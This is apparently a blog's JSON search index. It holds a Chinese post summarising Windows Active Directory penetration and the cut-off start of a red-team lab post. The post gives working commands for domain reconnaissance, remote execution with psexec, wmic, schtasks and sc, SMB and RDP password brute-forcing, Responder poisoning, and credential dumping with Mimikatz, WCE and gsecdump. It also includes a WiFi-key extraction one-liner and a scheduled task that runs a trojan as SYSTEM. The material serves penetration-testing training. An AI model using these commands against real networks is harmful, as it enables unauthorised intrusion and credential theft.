{"meta":{"title":"13l00m'World","subtitle":"","description":"","author":"13l00m","url":"https://13l00m.github.io","root":"/"},"pages":[{"title":"My Blog Name | 404","date":"2020-03-08T15:06:44.082Z","updated":"2020-03-08T15:04:18.108Z","comments":true,"path":"404.html","permalink":"https://13l00m.github.io/404.html","excerpt":"","text":""},{"title":"My Blog Name | 404","date":"2020-03-08T15:04:18.108Z","updated":"2020-03-08T15:04:18.108Z","comments":true,"path":"404.html","permalink":"https://13l00m.github.io/404.html","excerpt":"","text":""},{"title":"","date":"2020-03-08T15:00:31.575Z","updated":"2020-03-08T15:00:31.575Z","comments":false,"path":"tags/index.html","permalink":"https://13l00m.github.io/tags/index.html","excerpt":"","text":""},{"title":"","date":"2020-03-08T15:00:42.601Z","updated":"2020-03-08T15:00:42.601Z","comments":false,"path":"categories/index.html","permalink":"https://13l00m.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"域渗透总结","slug":"域渗透总结","date":"2020-03-09T14:01:06.000Z","updated":"2020-03-09T14:07:35.566Z","comments":true,"path":"2020/03/09/域渗透总结/","link":"","permalink":"https://13l00m.github.io/2020/03/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/","excerpt":"","text":"内网和域内网局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。 域域（Domain）是相对工作组（Workgroup）的概念，形象的说，域就像中央集权，由一台或数台域控制器（Domain Controller）管理域内的其他计算机；工作组就像各自为政，组内每一台计算机自己管理自己，他人无法干涉。 域是一个计算机群体的组合，是一个相对严格的组织，而域控制器则是这个域内的管理核心。 域控制器可以对域内计算机进行集中管理，比如在域控制器上可以定义所有用户不能更改桌面，或者所有用户的密码长度必须8位以上，而工作组环境的计算机则无法做到这些。 一般情况下，域控制器集成了DNS服务，可以解析域内的计算机名称（基于TCP/IP），解决了工作组环境不同网段计算机不能使用计算机名互访的问题。 域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后， 2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。 – 域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域;每个域都有自己的安全策略，以及它与其他域的安全信任关系。 – 域：域是一种管理边界，用于一组计算机共享共用的安全数据库，域实际上就是一组服务器和工作站的集合。 域和域之间可以通过VPN等设备进行连接，并建立从属和平行的域关系 域、工作组、家庭组工作组: 所有的计算机都是对等的，没有计算机可以控制另一台计算机。每台计算机都具有一组用户帐户。若要登录到工作组中的任何计算机，您必须具有该计算机上的帐户。 通常情况下，计算机的数量不超过二十台。 工作组不受密码保护。 所有的计算机必须在同一本地网络或子网中。 家庭组： 家庭网络中的计算机必须属于某个工作组，但它们也可以属于某个家庭组。使用家庭组，可轻松与家庭网络中的其他人共享图片、音乐、视频、文档和打印机。 家庭组受密码保护，但在将计算机添加到家庭组时，只需要键入一次密码即可。 域： 有一台或多台计算机为服务器。网络管理员使用服务器控制域中所有计算机的安全和权限。这使得更容易进行更改，因为更改会自动应用到所有的计算机。域用户在每次访问域时必须提供密码或其他凭据。 如果具有域上的用户帐户，您就可以登录到域中的任何计算机，而无需具有该计算机上的帐户。 由于网络管理员经常要确保计算机之间的一致性，所以，您也许只能对计算机的设置进行有限制地更改。 一个域中可以有几千台计算机。 计算机可以位于不同的本地网络中。 域渗透若直线攻击难以奏效，可以进行迂回进攻，从网络为突破，以受限用户权限开始，分析网络结构，制定对应的攻击方案，获取目标的域管理账户，逐步掌控整个网络。 命令参见:内网渗透命令大全:https://www.t00ls.net/articles-39285.html Net基本命令 命令 说明 echo %PROCESSOR_ARCHITECTURE% 查看系统版本位数 set 查看系统环境变量 netstat -ano 查看开放的端口 `netstat -an find “3389”` ipconfig /all 查询本机IP段，所在域等 net config Workstation 当前计算机名，全名，用户名，系统版本，工作站域，登陆域 net user 本机用户列表 net localhroup administrators 本机管理员[通常含有域用户] net user /domain 查询域用户 net user 用户名 /domain 获取指定用户的账户信息 net user /domain b404 pass 修改域内用户密码，需要管理员权限 net group /domain 查询域里面的工作组 net group 组名 /domain 查询域中的某工作组 net group &quot;domain admins&quot; /domain 查询域管理员列表 net group &quot;enterprise admins&quot; /domain 获得企业管理员列表 net group 组名 /del /domain 删除域中的某组 net group 组名 组成员名 /del /domain 删除域中的某组的组成员 net localgroup administrators /domain 登录本机的域管理员 net group 组名 /add 增加域中的组 net localgroup administrators workgroup\\user001 /add 域用户添加到本机 net group &quot;domain controllers&quot; /domain 查看域控制器(如果有多台) net time /domain 判断主域，主域服务器都做时间服务器 net config workstation 当前登录域 net session 查看当前会话 net use \\\\ip\\ipc$ pawword /user:username@domain 建立IPC会话[空连接-***] net view \\\\ip 查询某IP共享 net use z: \\\\192.168.200.21\\文件夹名 建立映射到本机Z盘 net share 查看SMB指向的路径[即共享] at \\\\192.168.200.21:50 c:\\windows\\fuxk.exe 在共享主机上执行 net view 查询同一域内机器列表 net view /domain 查询域列表 net view /domain:test 查看test域中计算机列表 net view \\\\DC的机器名字 查看域控共享情况 nltest /domain_trusts 获取域信任信息 net session 查看当前会话 net start 查看当前运行的服务 net time /domain 查询主域服务器的时间 net time \\\\192.168.200.21 查看192.168.200.21机器的时间 echo %logonserver% 查看登陆到这台服务器的计算机 net accounts 查看本地密码策略 net accounts /domain 查看域密码策略 nbtstat –A ip netbios 查询 netstat –an/ano/anb 网络连接查询 netsh firewall show config 查看防火墙策略 netsh firewall show state 查看防火墙策略 route print 路由表 tracert IP 路由跟踪 arp -a 列出本网段内所有活跃的IP地址 arp -s (ip + mac) 绑定mac和IP arp -d (iP + mac) 解绑IP和Mac tasklist /V 查看进程[显示对应用户] tasklist /S ip /U domain\\username /P /V 查看远程计算机进程列表 psexec \\\\192.168.200.21 -u administrator -p b404pass -c gsecdump.exe -u 从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来 gsecdump -a 获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值 tasklist /S IP地址 /U 域名\\用户名 /P /V 查看远程计算机进程 tasklist /svc 查看进程 taskkill /im 进程名称(cmd.exe) 结束进程 taskkill /pid[进程码] -t(结束该进程) -f(强制结束该进程以及所有子进程) ping 主机名 显示IP qprocess * 类似tasklist qprocess /SERVER:IP 远程查看计算机进程列表 nslookup –qt-MX Yahoo.com 查看邮件服务器 whoami /all 查询当前用户权限等 set 查看系统环境变量 systeminfo 查看系统信息 qwinsta 查看登录情况 qwinsta /SERVER:IP 查看远程登录情况 fsutil fsinfo drives 查看所有盘符 gpupdate /force 更新域策略 whoami 查询账号所属权限 whoami /all 查看sid号 wmic bios 查看bios信息 wmic qfe 查看补丁信息 wmic qfe get hotfixid 查看补丁-Patch号，很实用 wmic qfe list full /format:htable &gt; hotfixes.htm 详细的补丁安装 wmic share get name,path 查看SMB指向路径 wmic startup 查看启动项 wmic service 查看服务 wmic os 查看OS信息 wmic service list brief 查看进程服务 wmic process list brief 查看进程 wmic startup list brief 启动程序信息 wmic product list brief 查看安装程序和版本信息（漏洞利用线索） wmic startup list full 识别开机启动的程序 wmic process where(description=&quot;mysqld.exe&quot;)&gt;&gt;mysql.log 获取软件安装路径 dir \\\\DC\\SYSVOL /s /a &gt; sysvol.txt 列出sysvol日志记录 xcopy \\\\dc2.b404.com\\sysvol.txt sysvol.txt /i /e /c 拷贝sysvol.txt到本地 REG query HKCU /v &quot;pwd&quot; /s 获取到存到注册表中的密码 dir /b/s config.* 查看所在目录所有前缀为config的文件 findstr /si password *.xml *.ini *.txt 查看后缀名文件中含有password关键字的文件 findstr /si login *.xml *.ini *.txt 查看后缀名文件中含有login关键字的文件 copy con ftp.bat 创建ftp.bat批处理，然后输入ifconfig等命令，按ctr+z退出，并创建成功 copy con test.vbs 创建test.vbs脚本，输入脚本后，按ctr+z退出，并创建成功 dsquery的AD查询工具 命令 说明 dsquery user domainroot -limit 65535 &amp;&amp; net user /domain 列出该域内所有用户名 `dsquery server -domain super.com dsget server -dnsname -site` dsquery contact 寻找目录中的联系人 dsquery subnet 列出该域内网段划分 query user 查询那些用户在线 dsquery group &amp;&amp; net group /domain 列出该域内分组 dsquery ou 列出该域内组织单位 dsquery server &amp;&amp; net time /domain 列出该域内域控制器 dsquery site -o rdn 搜索域中所有站点的名称 `dsquery group dc=super,dc=com more` psloggedon.exe 查询那台主机和用户登录到该主机上 netsess.exe //192.168.1.115 远程主机上无需管理员权限,查询到主机名和用户 reg query &quot;HKEY_CURRENT_USER\\SOFTWARE\\MICROSOFT\\TERMINAL SERVERCLIENT\\DEFAULT&quot; 获取最近mstsc登录的记录 DOS常用命令 命令 说明 mspaint 画图工具 calc 计算器 notepad 记事本 taskmgr 任务管理器 osk 打开屏幕键盘 gpedit.msc 组策略 services.msc 本地服务 compmgmt.msc 计算机管理 devmgmt.msc 设备管理器 winver 查看系统版本 magnify 放大镜实用程序 eventvwr 事件查看器 Regedit 打开注册表 resmon 资源监视器 WMIC BIOS get releasedate 查看电脑生产日期 mstsc -f 远程连接（可以全屏） 长命令一键获取WiFI密码：** for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&apos;netsh wlan showprofiles&apos;) do @echo%j | findstr -i -v echo | netsh wlan show profiles %jkey=clear copy 查看是否支持PowerShell： if defined PSModulePath (echo support powershell) else (echo not support powershell) copy 添加任务计划： schtasks.exe /Create /RU&quot;SYSTEM&quot; /SC MINUTE /MO 45 /TN FIREWALL /TR &quot;c:/muma.ex e&quot; /ED 2017/12/31 copy nbtscan扫描整个网络: nbtscan -r 192.168.200.0/24 copy ping 扫描内网存活主机： for /l %i in (1,1,255) do @ping 192.168.200.%i -w 1 -n 1 | find /i&quot;ttl&quot; copy 域机器对应的IP: FOR /F &quot;eol=- tokens=1 delims=\\ &quot; %a IN(&apos;net view&apos;) DO @(echo name: %a, ip: &amp; ping %a -w 1 -n 1 | find /i &quot;ttl&quot; &amp; echo.) copy 找主机名： for /l %i in (1,1,255) do @ping -a 192.168.200.%i -w 1 -n 1 | find /i &quot;Pinging&quot; copy 找B段： for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i &quot;Pinging&quot; copy 将Pinging改成Ping就可以适用于Win7 远程命令执行at（系统权限）利用计划任务at命令，常用的方法（系统权限）： net timeat \\\\127.0.0.1 23:00 c:\\winnt\\system32/viliosn.exeat \\\\127.0.0.1 1 delete /yes #删除本机1号任务 copy schtasks(用户权限和系统权限都可以)schtasks /create /tn asp_net /tr &quot;c:\\windows\\system32\\cmd.exe /c cmd&quot; /sc once /st 00:00 /S ip /RU System /u user /p passwordschtasks /run /tn asp_net /S ip /u user /p passwordschtasks /F /delete /tn asp_net /S ip /u user /p password copy sc系统权限的sc用法利用服务工具，指定用户权限启动 在192.130.16.22上创建一个xxoox的服务，程序执行命令为cmd.exe /c start c:\\programdata\\a+.bat sc \\\\192.130.16.22 create xxoox binPath= &quot;cmd.exe /c start c:\\programdata\\a+.bat&quot; copy 执行xxoox的服务，执行成功可能会提示错误1053，不宜作为启动项，一般用用户权限也是临时的： sc \\\\192.130.16.22 start xxooxsc \\\\192.130.16.22 delete xxoox copy 指定用户权限启动的用法在192.130.16.22上指定administrator账户创建一个adminsec服务： sc \\\\192.130.16.22 create adminsec binpath = “c:\\pass.exe” obj= “adminsec\\administrator” passwrod= adminsecsc \\\\192.130.16.22 start adminsec copy wmicWMI 的全称是 Windows Management Instrumentation，它出现在所有的 Windows 操作系统中，由一组强大的工具集合组成，用于1. 管理本地或远程的 Windows 系统。当攻击者使用wmiexec来进行攻击时，Windows系统默认不会在日志中记录这些操作，这意味着可以做到攻击无日志，同时攻击脚本无需写入到磁盘，具有极高的隐蔽性。越来越多的APT事件中也出现了WMI攻击的影子，利用WMI可以进行信息收集、探测、反病毒、虚拟机检测、命令执行、权限持久化等操作。(奇淫技巧可见wmi shell) 常见的WMI攻击工具： PTH-WMIS (最早wmi攻击的工具，单条命令执行，无回显，需要pth-smbget配合读取结果) impackets wmiexec(Linux跨window经常用) wmiexec.vbs (国人制造 为了回显会写文件) Invoke-WmiCommand&amp;Invoke-PowerShellWmi #在远程系统上执行 bat 脚本wmic /node:192.168.17.138 /user:test /password:!@#123QWE process call create c:\\programdata\\test.bat###在远程系统上执行单条命令wmic /node:192.168.17.138 /user:test /password:!@#123QWE process call create &quot;cmd.exe /c net user test1 !@#123QWE /add &amp;&amp; net localgroup administrators test1 /add#在远程系统上运行exe文件C:\\Users\\DC&gt;wmic /node:192.168.200.20 /user:web\\administrator /password:Web12345 process call create &quot;cmd.exe /c calc.exe&quot; copy 工具说明: 需要远程系统启动 Windows Management Instrumentation 服务，开放135端口 远程系统的本地安全策略的“网络访问: 本地帐户的共享和安全模式”应设为“经典-本地用户以自己的身份验证” wmic 会以管理员权限在远程系统上执行命令 防火墙开启将无法连接 如果报错 “Invalid Global Switch” ，用双引号把包含-的结点括起来即可正常执行。 [ img](https://b404.xyz/img/hack/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/post/92aa573b-2e90-4248-88c5-dd23cb48ae5b.png) img wmiexecWMI 可以远程执行命令，大牛使用VBS脚本调用WMI来模拟 psexec 的功能，于是乎 WMIEXEC 就诞生了。基本上psexec 能用的地方，这个脚本也能够使用。 常用命令: ###获取半交互式shellcscript.exe //nologo wmiexec.vbs /shell 192.168.17.138 test !@#123QWE###在远程系统上执行单条命令cscript.exe wmiexec.vbs /cmd 192.168.17.138 test !@#123QWE &quot;cmdkey /list&quot;###在远程系统上执行 bat 脚本cscript.exe wmiexec.vbs /cmd 192.168.17.138 test !@#123QWE c:\\programdata\\test.bat copy 其它参数: -wait5000 表示这个命令等待5s后再读取结果，用于运行“运行时间长”的命令。 -persist 程序会在后台运行，不会有结果输出，而且会返回这个命令进程的 PID，方便结束进程，用于运行 nc 或者木马程序。 下面这段代码在脚本的一开始，是控制结果文件路径、文件名、以及默认代码执行时间的，可以自行更改。 Const Path = &quot;C:\\&quot; Const FileName = &quot;wmi.dll&quot; Const timeOut = 1200 copy 工具说明: 需要远程系统启动 Windows Management Instrumentation 服务，开放135端口 远程系统的本地安全策略的“网络访问: 本地帐户的共享和安全模式”应设为“经典-本地用户以自己的身份验证” wmicexec.vbs 会以管理员权限在远程系统上执行命令 virustotal 显示 wmiexec.vbs 会被 Kaspersky、Symantec 和 ZoneAlarm 查杀。 impackets wmiexec使用impackets wmiexec执行命令测试，执行命令可以回显。在Linux跨window渗透时候经常使用。 #登陆远程机器python wmiexec.py administrator:Web12345@192.168.63.150 copy [ img](https://b404.xyz/img/hack/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/post/1d54a2c2-f7f9-4a3d-9464-953618fe1581.jpg) img psexec常用命令 ###获取管理员用户权限的交互式 shellpsexec \\\\192.168.17.138 -u Administrator -p !@#123QWE cmd###获取普通用户权限的交互式 shell，原因参见 LocalAccountTokenFilterPolicy,要想获取管理员权限 shell ，需要添加 -h 参数。psexec \\\\192.168.17.138 -u test -p !@#123QWE cmd###在远程系统上以 system 权限执行单条命令，有时回显只有一行，原因尚不清楚。psexec \\\\192.168.17.138 -u Administrator -p !@#123QWE -s cmd /c &quot;quser&quot;###在远程系统上执行 bat 脚本psexec \\\\192.168.17.138 -u Administrator -p !@#123QWE c:\\programdata\\test.bat###拷贝文件到远程机器并以交互方式运行，运行结束后会删除psexec \\\\192.168.17.138 -c C:\\Users\\test\\Desktop\\GetHashes.exe copy 其它参数 –accepteula 第一次运行会弹框,输入这个参数便不会弹框-s 以 “nt authority\\system” 权限运行远程进程-h 如果可以，以管理员权限运行远程进程-d 不等待程序执行完就返回，请只对非交互式应用程序使用此选项\\\\ip 可以替换成 @ip.txt (存放多个 ip 的文本)，可以批量执行命令 copy 工具说明 需要远程系统开启 ADMIN$ 共享 建立 ipc 连接后可以不指定用户名和密码 不能仅拷贝文件不执行，只需要拷贝时可以建立 ipc 连接后c opy 在启动psExec建立连接之后，远程系统上会被安装一个服务：PSEXESVC。安装服务会留下日志，而且psexec退出时有可能服务删除失败，所以不推荐使用 psexec。 PsRemotingPowerShell远程命令执行基于WinRM。WinRM指的是Windows远程管理服务，它会监听HTTP(5985)、HTTPS(5986)，不过此服务除了Windows Server 2012及R2默认启用外，其他默认都是禁用的。管理员为了方便对服务器的远程管理，也许将此端口开启，这种事就像内网弱口令一样，做渗透嘛，什么奇迹都有可能发生。 利用PowerShell渗透可以绕过杀软、绕过白名单防护设备，并且还可以得到返回的数据，简直是杀人越货神器。默认禁用PS。 #先开启执行策略set-executionpolicy unrestricted#在目标机器上开启ps远程功能enable-psremoting#开启远程连接Enter-PSSession 192.168.200.20 -Credential administrator copy [ img](https://b404.xyz/img/hack/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/post/5f86bde0-3bdb-4c2e-995e-dc1e80ffbbd0.png) img 定位 收集域以及域内用户信息 收集域内域控制器信息 收集域控上域用户登录日志信息 收集域内所有用户名以及全名、备注等信息 收集域内工作组信息 收集域管理员帐号信息 收集域内网段划分信息 收集域内组织单位信息 服务器(机器)定位不管是做外网还是内网，信息收集都是很有必要的第一步，当我们控下一台机器的时候，内网是个什么结构？这台机器是一个什么角色？使用机器的人是一个什么角色？上面装的什么杀毒？机器是怎么上网的？机器是笔记本，还是台式机？等等等等。。。ipconfig /all //用来查看当前机器的网络环境,判断是工作组,还是域环境.网段是怎么划分的,每个段有多少台机器,DNS服务器IP是多少。net view //用来查看跟本机有关联的机器名.注意,是跟本机有关联的机器,而不是一个段的机器.net view /domain//用来查看当前网络环境存在几个域.net view /domain:xxxx//查看xxx域中存在的跟本机有关联的机器.net group &quot;domain admins&quot; /domain//查看域内管理员.net user /domain//查看域内的用户名.net group &quot;domain computers&quot; /domain//查看域内所有机器名.net time /domain//查看域时间及域服务器的名字Nslookup -type=SRV _ldap._tcp.//查询DNSnetstat//查看连接信息.net group &quot;Domain Controllers&quot; /domain//查找域控nbtstat//由IP地址得到机器名 copy 上面我们已经得到了一些内网信息,现在我们就需要好好分析一下了. 1、分析出内部网络是怎么划分的.是按照部门划分的网络段,还是按照楼层,还是按照地区划分. 2、分析出内部网络机器名的命名规则.特别是个人机,这对选取有价值目标很重要.不过有些内网是采用的无规则命名法,这也是正常的.但是一般还是有规律的. 3、分析出内部网络重要人的电脑名.这些重要人物一般在对外网站上都会有一些介绍的.再根据机器命名规则,就可以大概分析得出这些机器.这里要注意,有些人有多个电脑哦.还有些人用的是笔记本的. 4、分析域结构,有些内部网络是多层域结构,而且还是多级域结构,这样,我们就需要先分析出,现在这电脑所在域是几级子域,这个子域域控以及根域域控是哪些,还有其他域的域控是哪些.一般域控命名都有DC字样. 文件定位服务器定位总结出文件定位的大致思路： 定位人力资源主管个人机 定位人力资源相关文档存放位置 从人力资源文档中找相关人 定位相关人的机器 监视相关人工作时存放文档的位置 列出存放文档服务器的目录 文件定位需要注意的点： 产品名称 内部名称 项目负责人 项目团队 生产部（分公司，工厂，代工厂） 经验： FTP SMB DC\\NETLOGON\\ 产品管理系统（仓库管理系统） 各种数据库 其他服务器（分公司，工厂，代工厂） 定位文件服务器请参考上一节定位服务器（机器），定位到文件服务器和某个人，对于文件定位来说应该会事半功倍。这里就不过多叙述了。 管理员定位0x01工具： psloggedon.exe:通过检验注册表里HKEY_USERS的key值来查询谁登陆过机器，同样也调用到了NetSessionEnum API。某些功能需要管理员权限 netsess.exe:调用NetSessionEnum API，并且在远程主机上无需管理员权限。 PVEFindADUser.exe:用于枚举域用户以及登陆过特定系统的用户，需要管理员权限 netview.exe:使用WinAPI枚举系统，利用NetSessionEnum来找寻登陆sessions,利用NetShareEnum来找寻共享 , 利用 NetWkstaUserEnum 来枚举登陆的用户。它也能查询共享入口和有价值用户，还能使用延迟和抖动。绝大部分功能不需要管理员权限。 hunter:hunter是一款利用 Windows API 调用来枚举跳板机上的用户登录信息的工具 Nmap的NSE脚本 ：如果你有域账户或者本地账户，你可以使用Nmap的smb-enum-sessions.nse 引擎来获取远程机器的登录session，并且不需要管理员权限 smb-enum-domains.nse对域控制器进行信息收集扫描，可以获取主机信息，用户，密码策略可以用的用户等 smb-enum-users.nse在进行域渗透的时候，有了域内某台主机的权限，但是权限有限，不能获取更多的域用户信息的时候，可以借助这个脚本对域控制器进行扫描 smb-enum-shares.nse遍历远程主机的共享目录 smb-enum-processes.nse通过smb对主机的系统进程进行遍历，通过这些信息，可以知道目标主机上运行软件信息，选择合适的漏洞或者规避防火墙以及杀毒软件。 smb-enum-sessions.nse通过smb获取域内主机的用户登录session，查看当前是否有用户登录，对于我们抓取用户hash以及避免同时登陆被用户发现。 smb-os-discovery.nse通过smb协议来收集目标主机的操作系统，计算机名，域名，全称域名，域林名称，NetBIOS机器名，NetBIOS域名，工作组，系统时间。 0x02 Active Directory: 通过AD信息来识别一些连接到服务器的用户： http://www.harmj0y.net/blog/redteaming/trusts-you-might-have-missed/ http://www.sixdub.net/2014/11/offensive-event-parsing-bringing-home-trophies/ 0x03PowerShell： 针对windows机器，可以考虑用wmi脚本和powershell脚本进行扫描，低频扫描可以很容易的绕过IDS的规则。PowerShell有很多方法Windows Api并且绕过白名单: http://www.mottoin.com/89568.html 0x04 查找域管理进程： https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/ 进攻1、内网WEB渗透.内网的WEB,一般情况下是比较容易搞下的,毕竟不像放在公共网络上.有那么大的风险,相对的,管理也就松散一些了.而且,内网的一些服务器是做测试用的,至于哪些服务器是做什么用的,可以通过判断机器名来分析,机器名的命名大多是有规律的.这跟国家风俗有一些习惯,但是也有公司采用无规则命令法,这就很蛋疼. 2、内网SQL.内网的SQL一般是特别有用的.因为一般域结构的内网,都会比较看重权限.那么一般WEB上都会有登陆验证,这些验证SQL就特别有用了，拿下来,对应人跟机器,后面,你懂的. 3、抓HASH，弱口令匹配内网机器。一般内网的机器弱口令还是存在的。分析一些内部的常用密码，然后再自己组合一些密码，再用工具去匹配，一般还是有收获的。以前有些HASH还破解不出来，还得依靠HASH注入这些技术，现在有了新东西mimikatz，可以抓取内存的密码，还是直接明文的。容易多了。 4、内网进攻常用命令整理： net use \\\\IP\\ipc$ password /user:username@domain（IPC对方）net use \\\\ip\\ipc$ &quot;pwd&quot; /user:ip\\username@domain （解决IPC时遇到权限问题）net time \\\\IPat \\\\IP copy 取得合法身份前的攻击认证攻击Windows常攻击Windows的文件和打印共享服务，这项服务运行在SMB(服务器消息块)上，尝试远程共享加载：试着连接一个共享卷(比如IPC$或C$共享卷)： net use \\\\192.168.200.21\\IPC$ * \\u:用户名 copy *表示手动输入密码 也可以使用FOR语句来爆破密码，将tokent.txt的第一个字串赋值给%i（密码），将第二个字串赋值给%j(用户名) FOR /F &quot;tokens=1,2*&quot; %i in (token.txt) do net use \\\\192.168.200.21\\IPC$ %i /u:%j copy [ img](https://b404.xyz/img/hack/%E5%86%85%E7%BD%91/net_use_for.png) img 也可以使用以下工具进行口令猜测： enum Brutus THC Hydra Medusa 用enum爆破： C:\\Users\\win2k8\\Desktop&gt;enum.exe -D -u Administrator -f credentials.txt 192.168.200.21 copy 有时候也可以直接爆破远程桌面服务。 用TSGrinder爆破RDP： C:\\Users\\win2k8\\Desktop\\tsgrinder-2.03&gt;echo Admin 1&gt;a &amp; tsgrinder.exe -w a -u Administrator -n 1 192.168.200.21 1&gt;out copy 该工具主要针对于XP和2003，当用在win7的时候，需要将注册表HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Windows Error Reporting\\Dont Show UI设为1. kali下的rdesktop爆破： rdesktop -u Administrator -p token.txt 10.10.10.150 copy 扫描0x01 nbtscan: 使用nbtscan扫描： nbtstat -m 192.168.200.21nbtscan 192.168.200.0/24 copy [ img](https://b404.xyz/img/hack/%E5%86%85%E7%BD%91/nbtscan.png) img SHARING 表示开放来共享， DC 表示可能是域控，或者是辅助域控U=user猜测此计算机登陆名 IIS 表示运行来web80 EXCHANGE Microsoft Exchange服务 NOTES Lotus Notes服务 0x02:WinScanX: WinScanX 需要登录账号能够获取目标很详细的内容。其中还有snmp获取,windows密码猜解(但是容易被杀,nishang中也实现出一个类似的信息获取/Gather/Get-Information.ps1) 端口 端口号 端口说明 攻击技巧 21/22/69 ftp / tftp：文件传输协议 爆破\\嗅探\\溢出\\后门 22 ssh：远程连接 爆破OpenSSH; 28个退格 23 telnet：远程连接 爆破\\嗅探 25 smtp：邮件服务 邮件伪造 53 DNS：域名解析系统 DNS域名传输\\ DNS劫持\\ DNS缓存投毒\\ DNS欺骗\\利用DNS隧道技术刺透防火墙 67/68 dhcp 劫持\\欺骗 110 pop3 爆破 139 samba 爆破\\未授权访问\\远程代码执行 143 imap 爆破 161 snmp 爆破 389 ldap 注入攻击\\未授权访问 512/513/514 linux r 直接使用rlogin 873 rsync 未授权访问 1080 socket 爆破：进行内网渗透 1352 lotus 爆破：弱口令\\信息泄漏：源代码 1433 mssql 爆破：使用系统用户登录\\注入攻击 1521 oracle 爆破：TNS \\注入攻击 2049 nfs 配置不当 2181 zookeeper 未授权访问 3306 mysql 爆破\\拒绝服务\\注入 3389 rdp 爆破\\ Shift后门 4848 glassfish 爆破：控制台弱口令\\认证绕过 5000 sybase / DB2 爆破\\注入 5432 postgresql 缓冲区溢出\\注入攻击\\爆破：弱口令 5632 pcanywhere 拒绝服务\\代码执行 5900 vnc 爆破：弱口令\\认证绕过 6379 redis 未授权访问\\爆破：弱口令 7001 weblogic Java反序列化\\控制台弱口令\\控制台部署webshell 80/443/8080 web 常见web攻击\\控制台爆破\\对应服务器版本漏洞 8069 zabbix 远程命令执行 9090 websphere控制台 爆破：控制台弱口令\\ Java反序列 9200/9300 elasticsearch 远程代码执行 11211 memcacache 未授权访问 27017 mongodb 爆破\\未授权访问 凭据没有登录凭据的时候，可以破解对方的WPAv2个人Wifi密码，或者从某台不受域管理的主机下手。 ResponderResponder可以在一无所知的情况下取得最初的登陆凭据，其能率先监听、响应LLMNR协议(本地链路多播名称解析协议)和NBT-NS协议，其也可以利用WPAD（Web Proxy Auto-Discovery）漏洞（也就是浏览器设置为自动检测的设置，受害者会从网络获取配置文件） [ img](https://b404.xyz/img/hack/%E5%86%85%E7%BD%91/IE_Auto_detect_settings.png) img 该情况，与受害人主机处于同一个网络里的攻击人员，能够回复受害主机发出的名称解析请求，并注入自己的PAC文件，代理所有WEB流量。这种攻击方式能强制浏览器用户对攻击人员的SMB服务器进行验证。若受害者在我们的SMB服务器上进行身份验证，就能够获取这个主机的NTLM算法的哈希响应值，而受害者没有任何察觉，若该用户进行过域验证，那么它就会使用缓存中的登陆凭据对服务器进行验证。 python Responder.py -i 10.10.10.149 -I eth0 -b Off -r Off -w On copy 收到WPAD请求的时候发送恶意响应。 组策略首选项GPP的全名是组策略首选项，是为了满足管理活动目录的需要存在的，GPP的操作对象是组策略对象（GPO），在所有计算机上更新密码或者指定新的管理员，就会使用这个机制更新。GPP发布的账号信息全部存储在\\\\[Domain Controller]\\SYSVOL\\[Ddomain]\\Policies中。可以在该文件夹找到一个名为Groups.xml的文件。若能找到该文件，就可以在Groups.xml文件找到cpassword的哈希值。然后使用gpprefdecrypt.py解密GPP中本地管理员账户的密码，或者使用msf中的post/windows/gather/credentials/gpp获取本地管理员账号。 抓HASHGet-PassHashes.ps1脚本在Administrator的权限下，可以dump出密码哈希值。这个脚本来自于msf中powerdump，但做出了修改，使得我们不再需要System权限就可以dump了。 PS C:\\Users\\Tim\\Desktop\\nishang-master&gt; Set-ExecutionPolicy remotesignedPS C:\\Users\\Tim\\Desktop\\nishang-master&gt; Import-Module .\\nishang.psm1PS C:\\Users\\Tim\\Desktop\\nishang-master&gt; Get-PassHashes copy WCEWCE能够列出Windows中的登陆会话、增加、修改、查询和删除相关凭据(LM/NT哈希值,Kerberos票据，明文密码)。 wce -l列出已登陆的会话和NTLM凭据，wce -w用于复制存储在认证摘要信息中的明文密码。只要有管理员权限就可以抓取密码，无需破解hash值。 [ img](https://b404.xyz/img/tools/domain/hash/wce.png) img MinikatzMimikatz可从LSASS中恢复明文密码。 [ img](https://b404.xyz/img/tools/domain/hash/mimikatz.png) img 转自： http://b404.xyz/2017/12/30/exploit-domain/#%E5%86%85%E7%BD%91%E5%92%8C%E5%9F%9F","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://13l00m.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"内网","slug":"内网","permalink":"https://13l00m.github.io/tags/%E5%86%85%E7%BD%91/"},{"name":"域渗透","slug":"域渗透","permalink":"https://13l00m.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"}]},{"title":"【红日sec】内网渗透靶场","slug":"【红日sec】内网渗透靶场","date":"2020-03-09T12:40:15.000Z","updated":"2020-03-09T12:44:24.665Z","comments":true,"path":"2020/03/09/【红日sec】内网渗透靶场/","link":"","permalink":"https://13l00m.github.io/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/","excerpt":"","text":"靶场下载地址：http://vulnstack.qiyuanxuetang.net/vuln/detail/2/开始之前先